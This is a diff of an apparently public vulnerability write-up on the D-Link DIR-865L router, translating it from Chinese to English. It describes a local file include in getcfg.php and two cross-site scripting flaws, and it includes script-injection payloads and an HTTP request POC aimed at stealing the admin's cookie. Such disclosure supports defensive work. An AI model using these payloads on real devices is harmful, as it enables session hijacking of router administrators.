@@ -1,4 +1,4 @@
-###  任意文件读取getcfg
+###  Local File Include
 
 getcfg.php
 
@@ -34,11 +34,11 @@ SERVICES=DEVICE.ACCOUNT&aaa=%0aAUTHORIZED_GROUP=1
 
 ![image-20191031111027019](https://github.com/Cyc1eC/D-Link/blob/master/DIR-865L/image-20191031111027019.png)
 
-可以读任意.xml.php文件
+We can arbitrarily include all files ending in .xml.php,suce as DEVICE.ACCOUNT.xml.php
 
 ### 2.XSS
 
-#### （1）文件位置parentalcontrols/register.php
+#### （1）path: parentalcontrols/register.php
 
 ```
 			var Response = "<? echo $Response; ?>";
@@ -76,15 +76,16 @@ SERVICES=DEVICE.ACCOUNT&aaa=%0aAUTHORIZED_GROUP=1
 			var BODY = new Body();	
 ```
 
-* else var pwd = "<? echo $_GET["password"];?>"; 构造即可直接触发
+* else var pwd = "<? echo $_GET["password"];?>"; We can construct the value of password arbitrarily
+if we send data : </script><script>alear(document.cookie)</script><script> we can get the cookie of Admin
 
 ![image-20191031111539987](https://github.com/Cyc1eC/D-Link/blob/master/DIR-865L/image-20191031111539987.png)
 
 
 
-#### 2.文件位置/htdocs/webinc/js/tools_fw_rlt.php
+#### 2.path: /htdocs/webinc/js/tools_fw_rlt.php
 
-代码
+code:
 
 ```php
 		$referer = $_SERVER["HTTP_REFERER"];
@@ -93,7 +94,7 @@ SERVICES=DEVICE.ACCOUNT&aaa=%0aAUTHORIZED_GROUP=1
 		$message = "'".i18n("The language pack image is invalid.")."', "."'<a href=\"".$referer."\">".i18n("Click here to return to the previous page.")."</a>'";
 ```
 
-$referer赋值点比较多，所以触发点也比较多。
+The $referer variable has more places to assign values, so there are more trigger positions.
 
 POC
 
@@ -106,7 +107,7 @@ Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 16
-Referer: </script><script>alert(11111)</script><script>
+Referer: </script><script>alert(document.cookie)</script><script>
 Cookie: uid=ScrWKA5Tlb
 Connection: close
 Upgrade-Insecure-Requests: 1
